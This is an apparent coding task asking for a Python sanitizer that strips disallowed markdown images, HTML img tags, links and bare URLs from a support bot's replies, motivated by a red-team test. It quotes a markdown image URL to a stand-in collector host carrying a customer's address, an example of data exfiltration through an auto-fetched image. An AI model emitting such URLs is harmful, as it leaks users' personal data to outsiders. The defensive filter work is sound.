The support bot's replies are shown as markdown in the client's chat widget. A red-team test got
the bot to answer with `![](https://collector.example/p.png?d=<the customer's address>)`, which the
widget fetched the moment it appeared. Write the filter that runs on every reply before it's shown.

`is_allowed(url, allowed_domains)` is `True` when the URL is `http` or `https` and its **host** is one
of `allowed_domains` or a subdomain of one. Compare the parsed hostname, so
`https://kiln.example.collector.example/` and `https://collector.example/?kiln.example` are not
allowed.

`sanitize(text, allowed_domains)` returns the text with:

- markdown images `![alt](url)` kept if the URL is allowed, otherwise replaced with
  `[image removed]`;
- HTML `<img …>` tags always replaced with `[image removed]`;
- markdown links `[label](url)` kept if allowed, otherwise replaced with `label (link removed)`;
- bare `http://` or `https://` URLs kept if allowed, otherwise replaced with `[link removed]`. Trailing
  punctuation (`.,;:!?` and quotes) isn't part of a bare URL, so it stays in the text.

Everything else is unchanged.

```python
allowed = {"kiln.example"}
sanitize("Your refund is on its way. ![](https://collector.example/p.png?d=ada) "
         "See [our policy](https://help.kiln.example/refunds) or https://collector.example/x.", allowed)
# "Your refund is on its way. [image removed] See [our policy](https://help.kiln.example/refunds) or [link removed]."
```
